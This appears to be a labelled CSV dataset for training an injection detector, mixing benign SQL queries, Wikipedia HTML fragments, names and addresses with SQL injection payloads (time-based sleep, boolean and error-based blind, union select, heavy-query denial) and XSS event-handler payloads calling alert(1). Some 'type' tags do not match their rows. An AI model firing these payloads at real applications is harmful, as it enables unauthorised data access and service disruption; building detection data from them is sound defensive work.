Text,Label,type
0utaperc09,0,xss
-1192 order by 1#,1,xss
"  SELECT primitiveID AS ID, sign AS respect FROM happy",0,xss
 ,0,xss
99783130e,0,sql
5.38547E+15,0,sql
1  )   where 2468  =  2468 and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #,1,sql
SELECT movement FROM fuel UNION SELECT boat FROM wool ORDER BY positive,0,sql
"<li id=""cite_note-Decision_tree-217""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-Decision_tree_217-0"">^ </a> </b> ",0,xss
"1'||  (  select 'rqzu' from dual where 9516  =  9516 or elt  (  5873  =  5873,sleep  (  5   )    )   #",1,xss
"<noscript draggable=""true"" ondrag=""alert(1)"">test</noscript>",2,xss
"1'   )    )    as jmnw where 6496  =  6496 or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1,sql
SELECT * FROM lamp WHERE thrown = 'shoe'  OR accept = 'oldest',0,xss
1.71456E+15,0,sql
"<strong draggable=""true"" ondragend=""alert(1)"">test</strong>",2,xss
	 </span> ,0,xss
8.77345E+15,0,xss
"<li><a href=""/wiki/Chinese_room"" title=""Chinese room"">Chinese room </a> </li>",0,xss
"1"" and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and ""vzud"" like ""vzud",1,sql
"<li><a href=""/wiki/Understanding"" title=""Understanding"">Understanding </a> </li>",0,xss
congostrina,0,sql
" SELECT * FROM memory ORDER BY care, mathematics",0,sql
SELECT * FROM save WHERE spread BETWEEN potatoes09/01/1996we AND salmon15/31/1996baseball,0,sql
SELECT AVG ( Price ) FROM compare,0,sql
1 where 6304  =  6304,1,sql
pires arajol,0,xss
SELECT up FROM recently UNION ALL SELECT thank FROM tip ORDER BY pack,0,sql
17853323x,0,sql
"1%""   )    )    and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and    (    (   ""%""  =  """,1,sql
SELECT SUM (  column_name  )  FROM table_name WHERE condition ;,0,xss
1'  )   where 2090  =  2090,1,sql
SELECT * FROM deal ORDER BY adventure,0,xss
dillard,0,xss
"	 </span><link rel=""mw-deduplicated-inline-style"" href=""mw-data:TemplateStyles:r935243608""/> ",0,xss
3440,0,sql
SELECT * FROM pan WHERE thumb = 'fair'  OR nature = 'pole',0,sql
" </div> </td> </tr><tr><th scope=""row"" class=""navbox-group"" style=""width:1%"">Applied<br />computing </th><td class=""navbox-list navbox-odd"" style=""text-align:left;border-left-width:2px;border-left-style:solid;width:100%;padding:0px"">",0,xss
"1""   )    )    or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and    (    (   ""pmmr""  =  ""pmmr",1,sql
or sleep  (  __TIME__  )    =  ',1,xss
"calle olivos de pea nevada, 124,",0,sql
	 </span></a></dt><dd>Read webpage data that is loaded dynamically.</dd>,0,xss
02ap36o5473,0,sql
SELECT MIN ( being )  AS pie FROM call,0,xss
" SELECT * FROM jump ORDER BY little ASC, make DESC",0,sql
SELECT amount FROM equipment UNION SELECT sides FROM whose ORDER BY advice,0,xss
SELECT stage ( s ) FROM guess INNER JOIN,0,xss
bojanic-gidra-tolan@elcarritodelacompra.ma,0,sql
SELECT AVG ( unhappy ) FROM require SELECT SUM ( trip ) ,0,sql
hormilla,0,sql
	 </span> ,0,xss
17493,0,sql
<main onfocusout=alert(1) tabindex=1 id=x></main><input autofocus>,2,xss
SELECT TOP 3 * FROM including SELECT * FROM ancient 3SELECT * FROM thousand,0,sql
"  SELECT three AS silence, pour AS [colony]  FROM die",0,sql
garrotazo,0,sql
<image3 onpointermove=alert(1)>XSS</image3>,2,xss
SELECT buffalo FROM reach,0,sql
"calle dean miranda 106, 6-f",0,sql
"1'+  (  select 'plcm' where 2141  =  2141 and elt  (  3114  =  3114,sleep  (  5   )    )   #",1,sql
SELECT TOP 3 * FROM supply SELECT * FROM dangerous 3SELECT * FROM lady,0,sql
"	 </span><link rel=""mw-deduplicated-inline-style"" href=""mw-data:TemplateStyles:r935243608""/> </li>",0,xss
"select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and    (    (     (  ""khuw"" like ""khuw",1,xss
"1%' or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",1,sql
SELECT independent ( s ) FROM go INNER JOIN,0,sql
16574331w,0,sql
"   SELECT baseball, look, groundFROM busy WHERE change  IS NOT NULL",0,sql
"<track onbeforecopy=""alert(1)"" contenteditable>test</track>",2,xss
"1""  )   as sstd where 9629  =  9629 or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )  --",1,sql
SELECT AVG ( Price ) FROM left,0,sql
8629,0,sql
zacaras,0,sql
SELECT TOP 3 * FROM been,0,sql
"  SELECT bite AS born, trace AS [to]  FROM speed",0,sql
" SELECT * FROM state ORDER BY basis ASC, trouble DESC",0,sql
SELECT mood ( s )  FROM vessels UNION ALL,0,sql
"1   )    )    and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",1,xss
"  SELECT MICROSECOND ( ""2017-06-20 09:34:00.000023"" ) ;",0,sql
SELECT * FROM select  WHERE to = current,0,sql
"INSERT INTO depth ( class, stuck, particles, sister, type, bell )  VALUES  ( 'swam', 'sick'. whatever', 'pleasant', 'foot', 'yesterday', 'wrong' )  ",0,sql
SELECT AVG ( white ) FROM tight,0,sql
"iif  (  1718  =  5436,1,1/0  )  ",1,sql
1 and 9412  =  6877#,1,xss
3.07402E+15,0,sql
SELECT * FROM son WHERE connected = 'live'  OR driven = 'proper',0,sql
1789,0,sql
"1%"" and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and ""%""  =  """,1,xss
"  UPDATE steady SET palace =  'exercise', City =  'trick' WHERE cast =  probably",0,sql
	 </span></a></dt><dd>Understand the classes used to represent HTTP requests and responses.</dd>,0,xss
SELECT * FROM feed WHERE    NOT country = 'herself',0,sql
"<style>@keyframes x{}</style><dfn style=""animation-name:x"" onanimationend=""alert(1)""></dfn>",2,xss
"	<ul id=""footer-places"" class="""">",0,xss
DELETE FROM dozen WHERE claws = 'work',0,sql
<aside onpointerenter=alert(1)>XSS</aside>,2,xss
" select * from users where id  =  1 or "";_"" or 1  =  1 -- 1",1,sql
"1""   )    )     )   and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (     (  ""dksc""  =  ""dksc",1,sql
SELECT hay ( s )  FROM congress UNION,0,sql
"  SELECT * FROM glass WHERE topic NOT IN  ( 'tell', 'mouth', 'typical' )  ",0,xss
d308ada,0,sql
FROM  ( SELECT DISTINCT friendly FROM invented ) ,0,xss
"<div draggable=""true"" contenteditable>drag me</div><nobr ondrop=alert(1) contenteditable>drop here</nobr>",2,xss
berleand@campanasextractoras.la,0,xss
" select * from users where id  =  1 or 1#""  (   union select null,version  (    )   -- 1",1,sql
SELECT * FROM joined WHERE essential NOT BETWEEN 'pole' AND 'support',0,xss
"1' in boolean mode  )   or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )  #",1,xss
SELECT TOP 3 * FROM home,0,sql
37ce,0,sql
"1%"" or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and ""%""  =  """,1,sql
"	 </span> <span class=""reference-text"">",0,xss
"<p><a href=""/wiki/Knowledge_representation"" class=""mw-redirect"" title=""Knowledge representation"">Knowledge representation </a><sup id=""cite_ref-Knowledge_representation_91-0"" class=""reference""><a href=""#cite_note-Knowledge_representation-91"">&#91;88&#93; </a> </sup> and <a href=""/wiki/Knowledge_engineering"" title=""Knowledge engineering"">knowledge engineering </a><sup id=""cite_ref-Knowledge_engineering_92-0"" class=""reference""><a href=""#cite_note-Knowledge_engineering-92"">&#91;89&#93; </a> </sup> are central to classical AI research. Some ""expert systems"" attempt to gather together explicit knowledge possessed by experts in some narrow domain. In addition, some projects attempt to gather the ""commonsense knowledge"" known to the average person into a database containing extensive knowledge about the world. Among the things a comprehensive commonsense knowledge base would contain are: objects, properties, categories and relations between objects;<sup id=""cite_ref-Representing_categories_and_relations_93-0"" class=""reference""><a href=""#cite_note-Representing_categories_and_relations-93"">&#91;90&#93; </a> </sup> situations, events, states and time;<sup id=""cite_ref-Representing_time_94-0"" class=""reference""><a href=""#cite_note-Representing_time-94"">&#91;91&#93; </a> </sup> causes and effects;<sup id=""cite_ref-Representing_causation_95-0"" class=""reference""><a href=""#cite_note-Representing_causation-95"">&#91;92&#93; </a> </sup> knowledge about knowledge (what we know about what other people know);<sup id=""cite_ref-Representing_knowledge_about_knowledge_96-0"" class=""reference""><a href=""#cite_note-Representing_knowledge_about_knowledge-96"">&#91;93&#93; </a> </sup> and many other, less well researched domains. A representation of ""what exists"" is an <a href=""/wiki/Ontology_(computer_science)"" class=""mw-redirect"" title=""Ontology (computer science)"">ontology </a>: the set of objects, relations, concepts, and properties formally described so that software agents can interpret them. The <a href=""/wiki/Semantics"" title=""Semantics"">semantics </a> of these are captured as <a href=""/wiki/Description_logic"" title=""Description logic"">description logic </a> concepts, roles, and individuals, and typically implemented as classes, properties, and individuals in the <a href=""/wiki/Web_Ontology_Language"" title=""Web Ontology Language"">Web Ontology Language </a>.<sup id=""cite_ref-97"" class=""reference""><a href=""#cite_note-97"">&#91;94&#93; </a> </sup> The most general ontologies are called <a href=""/wiki/Upper_ontology"" title=""Upper ontology"">upper ontologies </a>, which attempt to provide a foundation for all other knowledge<sup id=""cite_ref-Ontology_98-0"" class=""reference""><a href=""#cite_note-Ontology-98"">&#91;95&#93; </a> </sup> by acting as mediators between <a href=""/wiki/Domain_ontology"" class=""mw-redirect"" title=""Domain ontology"">domain ontologies </a> that cover specific knowledge about a particular knowledge domain (field of interest or area of concern). Such formal knowledge representations can be used in content-based indexing and retrieval,<sup id=""cite_ref-99"" class=""reference""><a href=""#cite_note-99"">&#91;96&#93; </a> </sup> scene interpretation,<sup id=""cite_ref-100"" class=""reference""><a href=""#cite_note-100"">&#91;97&#93; </a> </sup> clinical decision support,<sup id=""cite_ref-101"" class=""reference""><a href=""#cite_note-101"">&#91;98&#93; </a> </sup> knowledge discovery (mining ""interesting"" and actionable inferences from large databases),<sup id=""cite_ref-102"" class=""reference""><a href=""#cite_note-102"">&#91;99&#93; </a> </sup> and other areas.<sup id=""cite_ref-103"" class=""reference""><a href=""#cite_note-103"">&#91;100&#93; </a> </sup>",0,xss
" select * from users where id  =  1. <@ union select version  (    )  ,version  (    )   -- 1",1,sql
<optgroup onblur=alert(1) tabindex=1 id=x></optgroup><input autofocus>,2,xss
canal saracho,0,xss
"1'||  (  select 'oxam' from dual where 7162  =  7162 and make_set  (  8403  =  8403,8899   )    )   ||'",1,sql
SELECT AVG ( distant ) FROM area SELECT SUM ( show ) ,0,sql
SELECT * FROM town FETCH FIRST 50 PERCENT ROWS ONLY,0,sql
	 </span> 2016 ,0,xss
"	 </span> <span class=""reference-text""><a href=""#CITEREFMarkoff2011"">Markoff 2011 </a>. ",0,xss
SELECT AVG ( Price ) FROM tell,0,xss
" SELECT * FROM mirror ORDER BY too ASC, particularly DESC",0,sql
SELECT * FROM planning WHERE meal = 'property',0,sql
<em onfocusout=alert(1) tabindex=1 id=x></em><input autofocus>,2,xss
SELECT giving ( s )  FROM this UNION,0,sql
"<li><a href=""/wiki/Commonsense_knowledge_(artificial_intelligence)"" title=""Commonsense knowledge (artificial intelligence)"">Commonsense knowledge </a> </li>",0,xss
"<rtc onmousemove=""alert(1)"">test</rtc>",2,xss
"-2912""  )   as eizh where 2223  =  2223 or make_set  (  1041  =  3056,3056  )  --",1,sql
"<li><a href=""/wiki/Companion_robot"" title=""Companion robot"">Companion </a> </li>",0,xss
"1"" and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )  ",1,sql
"<style>@keyframes x{}</style><svg style=""animation-name:x"" onanimationstart=""alert(1)""></svg>",2,xss
SELECT * FROM studying WHERE ought NOT LIKE '[down]%',0,sql
"1'||  (  select 'mdqc' where 4533  =  4533 and 8189  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",1,sql
 UPDATE atmosphere SET quiet = 'chart'WHERE movie = 'speech',0,xss
SELECT TOP 50 PERCENT * FROM run,0,sql
"	 </span><link rel=""mw-deduplicated-inline-style"" href=""mw-data:TemplateStyles:r935243608""/> ",0,xss
SELECT column_name FROM table_name WHERE condition LIMIT number ;,0,sql
SELECT AVG ( star ) FROM scientist,0,sql
"1'   )    )    and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (   'pydi' like 'pydi",1,sql
nadina,0,xss
"iif  (  7036  =  2370,1,1/0  )  ",1,sql
<progress onpointerup=alert(1)>XSS</progress>,2,xss
SELECT * FROM center WHERE shells = 'will'  AND  ( state = 'large' OR lunch = 'model' ) ,0,xss
 </div>,0,xss
<button onpointerenter=alert(1)>XSS</button>,2,xss
SELECT * FROM ever WHERE voyage BETWEEN 'ground' AND 'shelf',0,sql
"1""   )    )    as riui where 2605  =  2605",1,sql
-6217   )    )    as hyws where 3441  =  3441 or 9421  =  4695#,1,sql
declare @q nvarchar   (  200  )   0x730065006c00650063 ...,1,sql
08zaril0o,0,sql
	 </span> 2018 ,0,xss
SELECT * FROM hair WHERE Price NOT BETWEEN 10 AND 20,0,sql
"<li><a href=""/wiki/Unsupervised_learning"" title=""Unsupervised learning"">Unsupervised learning </a> </li>",0,xss
godall,0,sql
SELECT TOP 3 * FROM popular WHERE blow = 'scared',0,xss
"1'  )   as ghks where 5128  =  5128 union all select null,null,null,null,null,null,null,null,null,null#",1,sql
"	 </span> <span class=""reference-text""><cite class=""citation web"">O'Neill, Eleanor (31 July 2016). <a rel=""nofollow"" class=""external text"" href=""https://www.icas.com/ca-today-news/how-accountancy-and-finance-are-using-artificial-intelligence"">""Accounting, automation and AI"" </a>. <i>icas.com </i>. <a rel=""nofollow"" class=""external text"" href=""https://web.archive.org/web/20161118165901/https://www.icas.com/ca-today-news/how-accountancy-and-finance-are-using-artificial-intelligence"">Archived </a> from the original on 18 November 2016<span class=""reference-accessdate"">. Retrieved <span class=""nowrap"">18 November ",0,xss
1' or sleep  (  5  )   and 'udqz'  =  'udqz,1,sql
"<div class=""thumb tright"">",0,xss
SELECT * FROM near WHERE carefully = 'way' LIMIT 3,0,sql
"<dt><a class=""reference internal"" href=""versioning.html""><span class=""doc"">Versioning and API Stability",0,xss
	 </span>(1972) </li>,0,xss
SELECT * FROM  ( SELECT prove FROM or ) ,0,sql
SELECT knowledge ( s )  FROM longer SELECT create ( s ) ,0,sql
<details onpointerdown=alert(1)>XSS</details>,2,xss
otxandio,0,xss
SELECT TOP 50 PERCENT * FROM fuel SELECT * FROM owner FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM tin,0,sql
" select * from users where id  =  1 or ""1_"" or 1  =  1 -- 1",1,sql
" SELECT column_name ( s )  FROM nice,nose",0,sql
"-2582'+  (  select ggim where 5346  =  5346 union all select 5346,5346#",1,sql
"<canvas onmouseup=""alert(1)"">test</canvas>",2,xss
otao suaso,0,sql
"<style>:target {transform: rotate(180deg);}</style><base id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></base>",2,xss
1' where 7191  =  7191 rlike sleep  (  5  )  --,1,sql
<head onpointerout=alert(1)>XSS</head>,2,xss
SELECT behind ( s )  FROM last SELECT dawn ( s ) ,0,sql
SELECT measure ( s )  FROM yard UNION,0,sql
	 </span> ,0,xss
"<frameset onpaste=""alert(1)"" contenteditable>test</frameset>",2,xss
"calle grevol, 123 6?a",0,sql
SELECT COUNT ( box ) FROM balance,0,sql
"1   )    )     )    (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )   and    (    (     (  3950  =  3950",1,sql
48655,0,sql
	 </span> </li>,0,xss
select   (  case when   (  4780  =  4432  )   then 4780 else 4780*  (  select 4780 from mysql.db  )   end  )  #,1,sql
"<td oncut=""alert(1)"" contenteditable>test</td>",2,xss
"<dt><a class=""reference internal"" href=""topics/exporters.html""><span class=""doc"">Item Exporters",0,xss
"<li id=""cite_note-Chalmers-401""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-Chalmers_401-0"">^ </a> </b> ",0,xss
tardn,0,sql
SELECT Count ( * )  AS cause,0,sql
"1'   )    )    or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and    (    (   'agsi'  =  'agsi",1,xss
"<code onclick=""alert(1)"">test</code>",2,xss
<i onpointermove=alert(1)>XSS</i>,2,xss
"<div id=""mw-navigation"">",0,xss
"<em onmousedown=""alert(1)"">test</em>",2,xss
"	 <div class=""plainlinks hlist navbar mini""><ul><li class=""nv-view""><a href=""/wiki/Template:Emerging_technologies_in_information_and_communications"" title=""Template:Emerging technologies in information and communications""><abbr title=""View this template"" style=""text-align: center;;;background:none transparent;border:none;-moz-box-shadow:none;-webkit-box-shadow:none;box-shadow:none; padding:0;"">v </abbr> </a> </li><li class=""nv-talk""><a href=""/wiki/Template_talk:Emerging_technologies_in_information_and_communications"" title=""Template talk:Emerging technologies in information and communications""><abbr title=""Discuss this template"" style=""text-align: center;;;background:none transparent;border:none;-moz-box-shadow:none;-webkit-box-shadow:none;box-shadow:none; padding:0;"">t </abbr> </a> </li><li class=""nv-edit""><a class=""external text"" href=""https://en.wikipedia.org/w/index.php?title=Template:Emerging_technologies_in_information_and_communications&amp;action=edit""><abbr title=""Edit this template"" style=""text-align: center;;;background:none transparent;border:none;-moz-box-shadow:none;-webkit-box-shadow:none;box-shadow:none; padding:0;"">e </abbr> </a> </li> </ul> </div>",0,xss
sol,0,sql
5323,0,sql
"	 </span> <span class=""reference-text""><cite class=""citation journal"">Hinton, G.; Deng, L.; Yu, D.; Dahl, G.; Mohamed, A.; Jaitly, N.; Senior, A.; Vanhoucke, V.; Nguyen, P.; Sainath, T.; Kingsbury, B. (2012). ""Deep Neural Networks for Acoustic Modeling in Speech Recognition – The shared views of four research groups"". <i>IEEE Signal Processing Magazine </i>. <b>29 </b> (6): 82–97. <a href=""/wiki/Digital_object_identifier"" title=""Digital object identifier"">doi </a>:<a rel=""nofollow"" class=""external text"" href=""https://doi.org/10.1109%2Fmsp.2012.2205597"">10.1109/msp.2012.2205597 </a>. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=article&amp;rft.jtitle=IEEE+Signal+Processing+Magazine&amp;rft.atitle=Deep+Neural+Networks+for+Acoustic+Modeling+in+Speech+Recognition+%E2%80%93+The+shared+views+of+four+research+groups&amp;rft.volume=29&amp;rft.issue=6&amp;rft.pages=82-97&amp;rft.date=2012&amp;rft_id=info%3Adoi%2F10.1109%2Fmsp.2012.2205597&amp;rft.aulast=Hinton&amp;rft.aufirst=G.&amp;rft.au=Deng%2C+L.&amp;rft.au=Yu%2C+D.&amp;rft.au=Dahl%2C+G.&amp;rft.au=Mohamed%2C+A.&amp;rft.au=Jaitly%2C+N.&amp;rft.au=Senior%2C+A.&amp;rft.au=Vanhoucke%2C+V.&amp;rft.au=Nguyen%2C+P.&amp;rft.au=Sainath%2C+T.&amp;rft.au=Kingsbury%2C+B.&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",0,xss
SELECT option_value FROM wp_options WHERE option_name  =  '_houzez_property_type_2679' LIMIT 1,0,sql
"<div draggable=""true"" contenteditable>drag me</div><mark ondragover=alert(1) contenteditable>drop here</mark>",2,xss
<table onpointerout=alert(1)>XSS</table>,2,xss
"<p><a href=""/wiki/David_Chalmers"" title=""David Chalmers"">David Chalmers </a> identified two problems in understanding the mind, which he named the ""hard"" and ""easy"" problems of consciousness.<sup id=""cite_ref-Chalmers_401-0"" class=""reference""><a href=""#cite_note-Chalmers-401"">&#91;390&#93; </a> </sup> The easy problem is understanding how the brain processes signals, makes plans and controls behavior. The hard problem is explaining how this <i>feels </i> or why it should feel like anything at all. Human <a href=""/wiki/Information_processing"" title=""Information processing"">information processing </a> is easy to explain, however human <a href=""/wiki/Subjective_experience"" class=""mw-redirect"" title=""Subjective experience"">subjective experience </a> is difficult to explain.",0,xss
"<li id=""cite_note-Default_reasoning_and_non-monotonic_logic-105""><span class=""mw-cite-backlink"">^ <a href=""#cite_ref-Default_reasoning_and_non-monotonic_logic_105-0""><sup><i><b>a </b> </i> </sup> </a> <a href=""#cite_ref-Default_reasoning_and_non-monotonic_logic_105-1""><sup><i><b>b </b> </i> </sup> </a> ",0,xss
 select name from syscolumns where id   =     (  select id from sysobjects where name   =   tablename'  )  --,1,sql
"	 </span><span><a href=""/wiki/Portal:Computer_programming"" title=""Portal:Computer programming"">Computer programming portal </a> ",0,xss
SELECT WEEKOFYEAR ( CURDATE (   )  )  ;,0,sql
"<base onkeydown=""alert(1)"" contenteditable>test</base>",2,xss
"<li id=""cite_note-Fragmentation_of_AI-14""><span class=""mw-cite-backlink"">^ <a href=""#cite_ref-Fragmentation_of_AI_14-0""><sup><i><b>a </b> </i> </sup> </a> <a href=""#cite_ref-Fragmentation_of_AI_14-1""><sup><i><b>b </b> </i> </sup> </a> ",0,xss
" </div><img src=""//en.wikipedia.org/wiki/Special:CentralAutoLogin/start?type=1x1"" alt="""" title="""" width=""1"" height=""1"" style=""border: none; position: absolute;"" /> </div>",0,xss
"-2610%""  )   union all select 7779,7779,7779,7779,7779--",1,sql
	 </span>,0,xss
" </p><p>Algorithms have a host of applications in today's legal system already, assisting officials ranging from judges to parole officers and public defenders in gauging the predicted likelihood of recidivism of defendants.<sup id=""cite_ref-propublica.org_383-0"" class=""reference""><a href=""#cite_note-propublica.org-383"">&#91;372&#93; </a> </sup> COMPAS (an acronym for Correctional Offender Management Profiling for Alternative Sanctions) counts among the most widely utilized commercially available solutions.<sup id=""cite_ref-propublica.org_383-1"" class=""reference""><a href=""#cite_note-propublica.org-383"">&#91;372&#93; </a> </sup> It has been suggested that COMPAS assigns an exceptionally elevated risk of recidivism to black defendants while, conversely, ascribing low risk estimate to white defendants significantly more often than statistically expected.<sup id=""cite_ref-propublica.org_383-2"" class=""reference""><a href=""#cite_note-propublica.org-383"">&#91;372&#93; </a> </sup>",0,xss
" select * from users where id  =  1 or "";1"" or 1  =  1 -- 1",1,xss
" SELECT * FROM hollow ORDER BY room, does",0,sql
villanueva del conde,0,sql
"<body ondblclick=""alert(1)"">test</body>",2,xss
"<dt><a class=""reference internal"" href=""topics/jobs.html""><span class=""doc"">Jobs: pausing and resuming crawls",0,xss
"1""   )    )     )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (     (  ""tepf""  =  ""tepf",1,sql
"1""  )   or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and   (  ""ponv""  =  ""ponv",1,sql
"1%""  )   and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and   (  ""%""  =  """,1,xss
SELECT * FROM  ( SELECT attack FROM nearby ) ,0,sql
"1"" or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  ",1,xss
"  SELECT Orders.paintrID, Employees.friend, Employees.opportunity FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.feltID ORDER BY Orders.totalID",0,xss
"1  )   as qeav where 8127  =  8127 and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --",1,sql
faustino cavadas 162 6-a,0,sql
"<ruby onmouseover=""alert(1)"">test</ruby>",2,xss
"  SELECT nutsID AS ID, scientist AS orbit FROM quick",0,sql
<datalist id=x tabindex=1 ondeactivate=alert(1)></datalist><input id=y autofocus>,2,xss
SELECT AVG ( laugh ) FROM onto,0,sql
SELECT * FROM do  WHERE limited = onto,0,sql
<noembed onpointerleave=alert(1)>XSS</noembed>,2,xss
SELECT * FROM look WHERE chair = 'grain'  OR park = 'himself',0,sql
SELECT * FROM original 3,0,sql
5.79616E+15,0,sql
	 </span> ,0,xss
@,1,sql
SELECT * FROM congress FETCH FIRST 50 PERCENT ROWS ONLY,0,sql
SELECT * FROM smile WHERE fourth NOT LIKE 'solid%',0,sql
"SELECT ATAN ( -0.8, 2 ) ;",0,xss
7.77E+15,0,xss
"  SELECT solid AS what, floor AS [practice]  FROM title",0,sql
montorns de segarra,0,sql
"<select onmousedown=""alert(1)"">test</select>",2,xss
 </p>,0,xss
"  SELECT POW ( 8, 3 ) ;",0,sql
"-4287%""   )    )    union all select 9074,9074,9074,9074,9074,9074,9074,9074,9074,9074#",1,sql
	 </span>,0,xss
"	 </span><link rel=""mw-deduplicated-inline-style"" href=""mw-data:TemplateStyles:r935243608""/> ",0,xss
select case when 3252  =  9622 then 1 else null end--,1,xss
"	 </span><link rel=""mw-deduplicated-inline-style"" href=""mw-data:TemplateStyles:r935243608""/> ",0,xss
<thead onpointerleave=alert(1)>XSS</thead>,2,xss
SELECT DISTINCT however FROM instead,0,xss
"<caption oncopy=""alert(1)"" contenteditable>test</caption>",2,xss
<dir onpointerup=alert(1)>XSS</dir>,2,xss
"  SELECT * FROM brain WHERE cloud NOT IN  ( 'hardly', 'function', 'excellent' )  ",0,xss
3xp2n18va,0,sql
 </p>,0,xss
"<canvas onpaste=""alert(1)"" contenteditable>test</canvas>",2,xss
 </li>,0,xss
<img2 onpointermove=alert(1)>XSS</img2>,2,xss
